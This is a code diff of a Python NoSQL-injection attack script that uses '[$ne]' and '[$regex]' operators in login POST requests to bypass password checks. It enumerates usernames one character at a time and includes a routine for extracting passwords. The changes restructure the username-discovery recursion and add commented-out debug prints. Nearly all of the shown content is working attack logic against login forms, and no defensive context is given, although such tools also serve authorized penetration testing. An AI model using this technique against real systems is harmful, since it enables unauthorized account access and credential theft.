@@ -10,7 +10,6 @@ try:
 except ImportError:
     from bs4 import BeautifulSoup
 
-counter = 0
 username = "admin"
 user_param = "username"
 password_param = "password"
@@ -208,15 +207,25 @@ def authenticate():
         main()
 
 def get_username(username):
-    global counter
     alphabet = list(string.ascii_letters) + list(string.digits)
-    while True: 
+    # print(alphabet)
+    params = {
+        user_param:username,
+        password_param + "[$ne]":'xXbOgUsXx'
+    }
+    # print(params)
+    response = send_sessionless_post(params)
+    if is_successfull(success_string, response):
+        log(f"Username length: {len(username)}")
+        log(f"User found: '{username}'")
+
+    while True:
         for c in alphabet:
             params = {
                 user_param + "[$regex]":"^"+username+c+".*",
                 password_param + "[$ne]":'xXbOgUsXx'
             }
-
+            # print(params)
             response = send_sessionless_post(params)
 
             if not response:
@@ -224,22 +233,12 @@ def get_username(username):
                 return
 
             if is_successfull(success_string, response):
-                counter = counter + 1
+                # print("canarySuccess")
                 get_username(username + c)
 
             if c == alphabet[-1]:
-                if len(username):
-                    if counter == len(username) - 1 and counter != 0:
-                        log(f"Username length: {len(username)}")
-                        log(f"User found: '{username}'")
-                        counter = 0
-                        return
-                    else:
-                        return
-                else:
-                    not_vulnerable()
-                    return
-
+                # print("canaryEndofAlph")
+                return
 
 
 def get_usernames():
@@ -267,6 +266,7 @@ def get_usernames():
 def get_password(username, pw_length):
     password = ""
     alphabet = string.printable
+    # print(alphabet)
     regex_chars = ['.', '^', '*', '+', '-', '?', '$', '\\', '|']
     count = pw_length-1
 
@@ -327,3 +327,4 @@ if __name__ == "__main__":
     else:
         url = sys.argv[1]
         main()
+                
